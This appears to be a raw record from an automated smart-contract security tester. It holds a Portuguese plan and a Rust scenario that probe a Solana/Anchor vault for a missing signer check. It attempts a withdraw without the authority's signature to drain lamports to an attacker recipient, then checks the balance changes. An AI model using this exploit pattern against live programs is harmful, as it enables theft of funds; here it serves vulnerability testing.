attempts.raw:
{
  "plan": "Inicializamos uma vault PDA com authority = carteira legitima e depositamos fundos. O uso legitimo de withdraw e feito pela authority assinando. O ataque repete a mesma chamada de withdraw, mas sem a assinatura da authority (apenas AccountInfo), tentando drenar os lamports da vault para um recipient controlado pelo atacante. Medimos se os lamports da vault diminuem e/ou os do recipient aumentam sem a assinatura da authority.",
  "scenario": "let authority = Pubkey::new_unique();
let attacker = Pubkey::new_unique();
let recipient = Pubkey::new_unique();

let (vault_pda, _bump) = Pubkey::find_program_address(&[b"vault", authority.as_ref()], &env.program_id);

// Baseline: initialize
let init_ix = env.anchor_ix(
    "initialize",
    &(),
    vec![
        AccountMeta::new(vault_pda, false),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(anchor_lang::solana_program::system_program::ID, false),
    ],
);
let (sys_id, sys_acc) = system_program_account();
let init_accounts = vec![
    (vault_pda, empty_account()),
    (authority, wallet(10_000_000_000)),
    (sys_id, sys_acc),
];
let r_init = env.baseline("initialize vault", &init_ix, &init_accounts);

// Baseline: deposit 1 SOL
let deposit_ix = env.anchor_ix(
    "deposit",
    &(1_000_000_000u64,),
    vec![
        AccountMeta::new(vault_pda, false),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(anchor_lang::solana_program::system_program::ID, false),
    ],
);
let mut deposit_accounts: Vec<(Pubkey, AccountSharedData)> = Vec::new();
for (k, a) in r_init.resulting_accounts.iter() {
    deposit_accounts.push((*k, a.clone()));
}
// ensure system program present
if !deposit_accounts.iter().any(|(k, _)| *k == sys_id) {
    deposit_accounts.push((sys_id, system_program_account().1));
}
let r_dep = env.baseline("deposit 1 SOL", &deposit_ix, &deposit_accounts);

// Build post-deposit state
let mut post: Vec<(Pubkey, AccountSharedData)> = Vec::new();
for (k, a) in r_dep.resulting_accounts.iter() {
    post.push((*k, a.clone()));
}
if !post.iter().any(|(k, _)| *k == sys_id) {
    post.push((sys_id, system_program_account().1));
}

// Legit withdraw by authority (baseline)
let withdraw_ix_legit = env.anchor_ix(
    "withdraw",
    &(500_000_000u64,),
    vec![
        AccountMeta::new(vault_pda, false),
        AccountMeta::new_readonly(authority, true),
        AccountMeta::new(recipient, false),
    ],
);
let mut legit_accounts = post.clone();
legit_accounts.push((recipient, wallet(1_000_000)));
let r_legit = env.baseline("legit withdraw by authority", &withdraw_ix_legit, &legit_accounts);

// Rebuild state for attack from post-deposit
let mut attack_accounts = post.clone();
attack_accounts.push((recipient, wallet(1_000_000)));

// Attack: withdraw without authority signature
let withdraw_ix_attack = env.anchor_ix(
    "withdraw",
    &(500_000_000u64,),
    vec![
        AccountMeta::new(vault_pda, false),
        AccountMeta::new_readonly(authority, false), // NOT signer
        AccountMeta::new(recipient, false),
    ],
);

let vault_before = attack_accounts
    .iter()
    .find(|(k, _)| *k == vault_pda)
    .map(|(_, a)| a.lamports())
    .unwrap_or(0);
let recipient_before = attack_accounts
    .iter()
    .find(|(k, _)| *k == recipient)
    .map(|(_, a)| a.lamports())
    .unwrap_or(0);

let r = env.attack("withdraw without authority signature", &withdraw_ix_attack, &attack_accounts);

if r.program_result == ProgramResult::Success {
    let vault_after = after(&r, &vault_pda).lamports();
    let recipient_after = after(&r, &recipient).lamports();
    env.effect(
        "vault lamports decreased without authority signature",
        vault_after < vault_before,
    );
    env.effect(
        "recipient lamports increased without authority signature",
        recipient_after > recipient_before,
    );
}"
}

